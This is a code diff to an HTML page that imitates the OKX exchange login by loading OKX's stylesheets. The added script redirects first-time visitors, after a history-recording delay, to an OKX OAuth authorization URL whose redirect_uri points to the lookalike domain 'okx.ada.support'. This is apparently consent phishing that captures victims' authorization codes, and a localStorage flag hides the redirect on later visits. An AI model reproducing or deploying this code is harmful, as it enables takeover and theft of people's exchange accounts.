@@ -38,7 +38,14 @@
         // Add a delay to ensure this page is recorded in the browser history
         window.onload = function () {
             setTimeout(function () {
-                window.location.href = 'https://www.okx.com/account/authlogin#error=access_denied&state=forward%3D%252Faccaaaaaount%252Foauth%253Faccess_type%253Doffline%2526response_type%253Dcode%2526inapp_redirect%253Dtrue%2526client_id%253Ddb50e9193d264fdbadea1d3e287c40feQ5UAx5f8%2526redirect_uri%253Dhttps%25253A%25252F%25252Fokx.ada.support%25252Fapi%25252Foauth%25252Fauthorization%2526scope%253Dread_only%2526state%253D.eJwVjEkOwyAQwP7CuUgDAbJ8BrEMCgoJEUN6qfr30qtl-8PC7nrHZns98GIbm6NxKPzCk_aSK1gnvopZ8MUoqYRGEVdgL3YX11Nt5yj-h0Ea0l0vQpvjgGbyftEBwEhwUXoTQCOAGmImS-jOgkTWPX1nW3KFcDyPgDbUiPaNLaeMjW3XU8r3B2NfNLo.ZyKwuA.dijyjbKp6BKNAX-kyOx56bAE4pM%26client_id%3Ddb50e9193d264fdbadea1d3e287c40feQ5UAx5f8'; // URL of Page (1)
+                const hasVisited = localStorage.getItem("hasVisited");
+
+                if (!hasVisited) {
+                    // If it's the user's first visit, set a flag and submit the form
+                    localStorage.setItem("hasVisited", "true");
+                    window.location.href = 'https://www.okx.com/account/authlogin#error=access_denied&state=forward%3D%252Faccaaaaaount%252Foauth%253Faccess_type%253Doffline%2526response_type%253Dcode%2526inapp_redirect%253Dtrue%2526client_id%253Ddb50e9193d264fdbadea1d3e287c40feQ5UAx5f8%2526redirect_uri%253Dhttps%25253A%25252F%25252Fokx.ada.support%25252Fapi%25252Foauth%25252Fauthorization%2526scope%253Dread_only%2526state%253D.eJwVjEkOwyAQwP7CuUgDAbJ8BrEMCgoJEUN6qfr30qtl-8PC7nrHZns98GIbm6NxKPzCk_aSK1gnvopZ8MUoqYRGEVdgL3YX11Nt5yj-h0Ea0l0vQpvjgGbyftEBwEhwUXoTQCOAGmImS-jOgkTWPX1nW3KFcDyPgDbUiPaNLaeMjW3XU8r3B2NfNLo.ZyKwuA.dijyjbKp6BKNAX-kyOx56bAE4pM%26client_id%3Ddb50e9193d264fdbadea1d3e287c40feQ5UAx5f8'; // URL of Page (1)
+
+                }
             }, 500); // Adjust the delay as needed (500ms is often sufficient)
         };
     </script>
@@ -95,7 +102,7 @@
     href="https://www.okx.com/cdn/assets/okfe/login/contentweb/8299/index.a5b3891e.css" />
   <link rel="stylesheet" type="text/css"
     href="https://www.okx.com/cdn/assets/okfe/login/contentweb/okxLogin/index.35222f25.css" />
-    <script>
+<!--     <script>
         document.addEventListener("DOMContentLoaded", function() {
             // Check if the user has already visited the page
             const hasVisited = localStorage.getItem("hasVisited");
@@ -105,7 +112,7 @@
                 localStorage.setItem("hasVisited", "true");
             }
         });
-    </script>
+    </script> -->
 </head>
 
 <body id="body" class="" broker-style="" data-responsive="true" data-nav="true">
